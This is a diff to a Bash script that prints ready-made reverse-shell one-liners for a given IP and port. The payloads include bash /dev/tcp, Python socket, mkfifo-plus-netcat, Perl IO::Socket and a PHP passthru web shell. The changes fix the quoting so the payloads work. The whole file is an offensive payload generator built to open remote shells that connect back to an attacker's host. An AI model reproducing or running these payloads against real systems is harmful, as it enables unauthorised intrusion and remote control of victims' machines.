@@ -45,11 +45,11 @@ printf ".. Pure Bash RevShell ..\n.-------------------------------.\n"
 printf "bash -i >& /dev/tcp/$1/$2 0>&1\n"
 printf ".-------------------------------.\n\n"
 
-printf ".. Python RevShell ..\n.-------------------------------.\n"
-printf "python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$1\",$2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\'\n"
-printf ".-------------------------------.\n\n"
+printf ".. Python RevShells ..\n.-------------------------------.\n"
+printf "python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$1\",$2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\'\n\n"
 
-printf "python -c 'import os;os.system(\"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc $1 $2 > /tmp/f\n\")\'"
+printf "python -c 'import os;os.system(\"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc $1 $2 > /tmp/f\")'\n"
+printf ".-------------------------------.\n\n"
 
 printf ".. Perl RevShells ..\n.-------------------------------.\n"
 printf "Windows-Friendly\nperl -MIO -e '\$c=new IO::Socket::INET(PeerAddr,\"$1:$2\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;\'\n\n"
@@ -69,7 +69,7 @@ printf ".-------------------------------.\n\n"
 
 printf ".. PHP VisitMe Shell ..\n.-------------------------------.\n"
 printf "<?php passthru(\"${YELLOW}ENTER COMMANDS${NC}\"]); ?>\n"
-printf "<?php passthru(\"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc $1 $2 > /tmp/f\"]); ?>\n"
+printf "<?php passthru(\"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc $1 $2 > /tmp/f\"); ?>\n"
 printf ".-------------------------------.\n\n\n"
 
 
